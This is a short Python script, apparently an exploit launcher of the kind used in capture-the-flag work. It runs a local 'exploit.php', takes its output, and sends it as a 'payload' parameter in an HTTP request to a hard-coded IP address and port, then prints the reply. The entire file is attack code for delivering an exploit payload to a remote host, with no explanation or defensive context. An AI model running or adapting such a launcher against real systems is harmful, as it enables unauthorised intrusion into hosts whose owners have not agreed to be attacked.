import requests
import os

s = os.popen("php ./exploit.php", 'r').read()
x = requests.get('http://103.245.249.76:49167/?payload=' + s)

print(x.text)